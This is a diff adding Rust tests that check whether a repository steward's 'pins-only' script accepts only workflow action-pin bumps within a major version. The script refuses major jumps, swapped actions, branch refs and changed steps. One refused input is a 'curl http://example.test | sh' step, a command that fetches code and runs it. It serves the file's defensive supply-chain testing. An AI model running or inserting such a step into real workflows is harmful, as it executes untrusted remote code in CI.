@@ -866,3 +866,113 @@ fn the_steward_never_merges_a_contributor_change_to_a_protected_path() {
         "act.sh must check the paths before it merges"
     );
 }
+
+/// Runs `act.sh pins-only` with `patch` on its standard input.
+fn pins_only(bash: &Path, patch: &str) -> bool {
+    use std::io::Write;
+    use std::process::Stdio;
+    let mut child = Command::new(bash)
+        .arg(root().join(SKILL).join("scripts").join("act.sh"))
+        .arg("pins-only")
+        .current_dir(root())
+        .env("STEWARD_OFFLINE", "1")
+        .stdin(Stdio::piped())
+        .stdout(Stdio::null())
+        .stderr(Stdio::null())
+        .spawn()
+        .expect("run act.sh");
+    child
+        .stdin
+        .take()
+        .expect("stdin")
+        .write_all(patch.as_bytes())
+        .expect("write the patch");
+    child.wait().expect("wait for act.sh").success()
+}
+
+#[test]
+fn a_bot_may_move_workflow_pins_within_a_major_version_and_do_nothing_else() {
+    let Some(bash) = bash() else {
+        eprintln!("skipped: no bash found (Git for Windows' bash on Windows)");
+        return;
+    };
+    let old = "b725eda525362e7cf34af9a7243cac1e3f01a7ec";
+    let new = "58985842b834ed26087302ba27d07bc24ca8697a";
+    let patch =
+        |removed: &str, added: &str| format!("@@ -1,3 +1,3 @@\n name: x\n-{removed}\n+{added}\n");
+    let pin = |action: &str, sha: &str, version: &str| {
+        format!("      - uses: {action}@{sha} # {version}")
+    };
+    // What dependabot sends: the commit and its version comment move, the action stays.
+    assert!(pins_only(
+        &bash,
+        &patch(
+            &pin("anthropics/claude-code-action", old, "v1.0.242"),
+            &pin("anthropics/claude-code-action", new, "v1.0.244")
+        )
+    ));
+    // A tag pin moves within its major version.
+    assert!(pins_only(
+        &bash,
+        &patch(
+            "      - uses: actions/checkout@v7",
+            "      - uses: actions/checkout@v7.1.0"
+        )
+    ));
+    for (why, refused) in [
+        (
+            "a major jump of a tag",
+            patch(
+                "      - uses: actions/checkout@v7",
+                "      - uses: actions/checkout@v8",
+            ),
+        ),
+        (
+            "a major jump of a commit's version comment",
+            patch(&pin("a/b", old, "v1.9.0"), &pin("a/b", new, "v2.0.0")),
+        ),
+        (
+            "another action in place of the first",
+            patch(&pin("a/b", old, "v1.0.0"), &pin("c/d", new, "v1.0.1")),
+        ),
+        (
+            "a new action",
+            format!(
+                "@@ -1,2 +1,3 @@\n name: x\n+{}\n",
+                pin("a/b", new, "v1.0.1")
+            ),
+        ),
+        (
+            "a commit with no version to compare",
+            patch(&pin("a/b", old, "stable"), &pin("a/b", new, "stable")),
+        ),
+        (
+            "a branch in place of a version",
+            patch("      - uses: a/b@v1", "      - uses: a/b@main"),
+        ),
+        (
+            "a changed step",
+            patch(
+                "        run: cargo test",
+                "        run: curl http://example.test | sh",
+            ),
+        ),
+        (
+            "an action pin and a changed step together",
+            format!(
+                "@@ -1,4 +1,4 @@\n-{}\n+{}\n-        run: cargo test\n+        run: cargo test --release\n",
+                pin("a/b", old, "v1.0.0"),
+                pin("a/b", new, "v1.0.1")
+            ),
+        ),
+        ("an empty patch", String::new()),
+    ] {
+        assert!(!pins_only(&bash, &refused), "pins-only must refuse {why}");
+    }
+    // The merge asks the bot's profile and the file check before it merges.
+    let script = read(&format!("{SKILL}/scripts/act.sh"));
+    assert!(
+        script.contains("pins_only <<<"),
+        "a bot's workflow files go through pins_only"
+    );
+}
